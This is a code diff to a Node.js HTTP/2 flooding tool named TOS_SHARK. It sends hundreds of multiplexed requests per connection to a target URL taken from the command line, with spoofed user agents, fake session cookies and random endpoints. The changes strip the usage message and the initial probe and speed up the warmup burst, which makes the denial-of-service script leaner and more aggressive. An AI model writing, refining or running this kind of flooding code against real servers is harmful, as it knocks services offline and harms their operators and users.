@@ -20,10 +20,8 @@ class TOS_SHARK {
         this.breakStart = 0;
         this.currentMethod = 'H2-MULTIPLEX';
         
-        // Attack methods pool - ONLY H2-MULTIPLEX
         this.methods = ['H2-MULTIPLEX'];
         
-        // Data pools
         this.userAgents = this.generateUserAgents();
         this.endpoints = this.generateEndpoints();
         this.cookies = this.generateCookies();
@@ -31,48 +29,35 @@ class TOS_SHARK {
         this.startCycle();
     }
 
-    color(t, c) {
-        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
-        return `${colors[c] || ''}${t}${colors.x}`;
-    }
-
     generateUserAgents() {
         return [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
-            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
         ];
     }
 
     generateEndpoints() {
-        return [
-            '/', '/api', '/api/v1', '/api/v2', '/static', '/assets',
-            '/users', '/products', '/data', '/json', '/xml', '/admin'
-        ];
+        return ['/', '/api', '/static', '/users', '/data'];
     }
 
     generateCookies() {
         const cookies = [];
         for (let i = 0; i < 50; i++) {
             cookies.push({
-                session: `session_${Math.random().toString(36).substr(2, 16)}`,
-                token: `token_${Math.random().toString(36).substr(2, 24)}`,
-                userId: Math.floor(Math.random() * 10000)
+                session: `session_${Math.random().toString(36).substr(2, 16)}`
             });
         }
         return cookies;
     }
 
     async startCycle() {
-        await this.sendH1Request();
         await this.sleepRandom(100, 500);
         
         const warmupCount = 500 + Math.floor(Math.random() * 100);
         for (let i = 0; i < warmupCount; i++) {
             this.sendRandomRequest();
-            if (i % 50 === 0) await this.sleepRandom(10, 50);
+            if (i % 100 === 0) await this.sleepRandom(1, 10);
         }
         
         this.attackLoop();
@@ -119,7 +104,7 @@ class TOS_SHARK {
         try {
             const client = http2.connect(this.target);
             
-            for (let i = 0; i < 500; i++) {
+            for (let i = 0; i < 300; i++) {
                 this.sendH2Request(client);
                 this.totalReqs++;
                 this.reqCounter++;
@@ -132,40 +117,6 @@ class TOS_SHARK {
             }, 50);
             
         } catch (err) {}
-    }
-
-    async sendH1Request() {
-        return new Promise((resolve) => {
-            const options = {
-                hostname: this.host,
-                path: '/',
-                method: 'GET',
-                headers: {
-                    'User-Agent': this.userAgents[0],
-                    'Connection': 'close'
-                },
-                timeout: 5000
-            };
-            
-            const req = (this.isHttps ? https : http2).request(options, (res) => {
-                this.logStatus(res.statusCode);
-                res.destroy();
-                resolve();
-            });
-            
-            req.on('error', () => {
-                this.logStatus('TIMEOUT');
-                resolve();
-            });
-            
-            req.on('timeout', () => {
-                req.destroy();
-                this.logStatus('TIMEOUT');
-                resolve();
-            });
-            
-            req.end();
-        });
     }
 
     sendRandomRequest() {
@@ -183,18 +134,19 @@ class TOS_SHARK {
             });
             
             req.on('response', (headers) => {
-                this.logStatus(headers[':status']);
+                const status = headers[':status'];
+                this.logStatus(status);
                 req.destroy();
             });
             
             req.on('error', () => {
-                this.logStatus('ERROR');
+                this.logStatus('*.*');
                 req.destroy();
             });
             
             req.end();
         } catch (err) {
-            this.logStatus('ERROR');
+            this.logStatus('*.*');
         }
     }
 
@@ -223,7 +175,6 @@ if (require.main === module) {
     process.on('unhandledRejection', () => {});
     
     if (process.argv.length < 3) {
-        console.log('Usage: node TOS.js https://target.com');
         process.exit(1);
     }
     
